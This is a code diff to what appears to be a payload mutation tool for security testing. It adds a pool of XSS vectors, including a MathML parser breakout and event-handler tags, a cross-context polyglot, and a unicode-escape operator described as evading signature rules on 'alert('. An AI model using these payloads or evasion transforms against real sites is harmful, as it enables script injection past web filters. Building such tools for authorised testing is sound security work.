@@ -134,22 +134,47 @@ def xss_event_handler_swap(payload: str) -> str:
     return re.sub(r"on[a-z]+(?=\s*=)", repl, payload, count=1, flags=re.IGNORECASE)
 
 
+_XSS_VECTOR_TEMPLATES = [
+    "<script>{call}</script>",
+    "<img src=x onerror={call}>",
+    "<svg onload={call}>",
+    "<body onload={call}>",
+    "<iframe src=javascript:{call}>",
+    "<details open ontoggle={call}>",
+    "<input autofocus onfocus={call}>",
+    "<select autofocus onfocus={call}>",
+    # MathML integration-point breakout: <mpath> opened inside a <style>
+    # in a <math> context closes the math context, so the trailing <img>
+    # is parsed as a live element and its onerror fires.
+    '<math><mtext></mtext><mglyph><style><mpath href="#</style><img src=x onerror={call}>',
+    # Media elements whose src fails to load fire onerror on their own.
+    "<video src=x onerror={call}>",
+    "<audio src=x onerror={call}>",
+    # <template> content: the inner <svg> still parses an onload handler
+    # via the parser's template-content handling (works in Chrome/FF).
+    "<template><svg onload={call}>",
+    # <data> wraps the <img> so the onerror handler still attaches.
+    "<data><img src=x onerror={call}>",
+    # Legacy form element; type=image renders it and src failure fires onerror.
+    "<isindex type=image src=x onerror={call}>",
+    # Scrolling text: onstart fires as soon as the marquee begins scrolling.
+    "<marquee onstart={call}>",
+    # <meter> with a value above max; onmouseover fires on hover.
+    "<meter value=2 max=1 onmouseover={call}>",
+    # <button formaction=javascript:> submits to a javascript: URL on click.
+    "<form><button formaction=javascript:{call}>",
+]
+
+
 def xss_tag_vector_swap(payload: str) -> str:
     """Swaps the delivery tag/vector while keeping the JS call, e.g.
-    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>."""
+    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>.
+
+    The full vector pool is _XSS_VECTOR_TEMPLATES, shared with the smoke
+    coverage tripwire so the two can't drift apart."""
     m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
     call = m.group(0) if m else "alert(1)"
-    vectors = [
-        f"<script>{call}</script>",
-        f"<img src=x onerror={call}>",
-        f"<svg onload={call}>",
-        f"<body onload={call}>",
-        f"<iframe src=javascript:{call}>",
-        f"<details open ontoggle={call}>",
-        f"<input autofocus onfocus={call}>",
-        f"<select autofocus onfocus={call}>",
-    ]
-    return random.choice(vectors)
+    return random.choice([tmpl.format(call=call) for tmpl in _XSS_VECTOR_TEMPLATES])
 
 
 def xss_attr_breakout(payload: str) -> str:
@@ -165,6 +190,41 @@ def xss_entity_obfuscate(payload: str) -> str:
     out = payload
     out = re.sub(r"javascript:", "javascript&colon;", out, flags=re.IGNORECASE)
     return out
+
+
+def xss_polyglot(payload: str) -> str:
+    """Emit a single canonical cross-context polyglot that fires BOTH in a
+    reflected-attribute context and in a raw tag context.
+
+    The leading `">` closes the (hypothetical) open attribute value AND the
+    enclosing tag; the trailing `<svg/onload=...>` is a minimal SVG vector
+    that runs on parse in a bare HTML context. Because the operator is a pure
+    deterministic transform (no randomness), its exact output is pinned in
+    tools/smoke.py as a regression tripwire.
+    """
+    m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
+    call = m.group(0) if m else "alert(1)"
+    return f'"><svg/onload={call}>'
+
+
+def xss_js_char_escape(payload: str) -> str:
+    """Escape the letters of any JS function name (alert/confirm/prompt) to
+    unicode \\uNNNN escapes so a signature rule matching the literal `alert(`
+    misses it; the leading letter stays literal, the rest is escaped, and the
+    argument list plus everything else are untouched, so the result is still
+    valid, behaviourally-identical JS (`a\\u006c\\u0065\\u0072\\u0074` ==
+    `alert`). Applies to every occurrence of the three names. Deterministic
+    (pure transform), so its exact output is pinned in tools/smoke.py."""
+    def _escape(s: str) -> str:
+        return s[0] + "".join(f"\\u{ord(c):04x}" for c in s[1:])
+    for name in ("alert", "confirm", "prompt"):
+        payload = re.sub(
+            r"\b" + name + r"\b",
+            lambda m: _escape(m.group(0)),
+            payload,
+            flags=re.IGNORECASE,
+        )
+    return payload
 
 
 def lfi_nested_traversal(payload: str) -> str:
@@ -282,6 +342,8 @@ ALL_MUTATIONS = [
     xss_tag_vector_swap,
     xss_attr_breakout,
     xss_entity_obfuscate,
+    xss_polyglot,
+    xss_js_char_escape,
     mysql_versioned_comment,
     whitespace_alt,
     sql_inline_comment_split,
@@ -302,7 +364,7 @@ OPERATORS_BY_CATEGORY = {
         case_randomize, add_whitespace_variants, insert_random_junk,
         html_entity_encode, url_encode_partial, script_null_byte_split,
         xss_event_handler_swap, xss_tag_vector_swap, xss_attr_breakout,
-        xss_entity_obfuscate, uri_case_fold,
+        xss_entity_obfuscate, xss_polyglot, xss_js_char_escape, uri_case_fold,
     ],
     "sqli": [
         case_randomize, add_sql_comment, add_whitespace_variants,
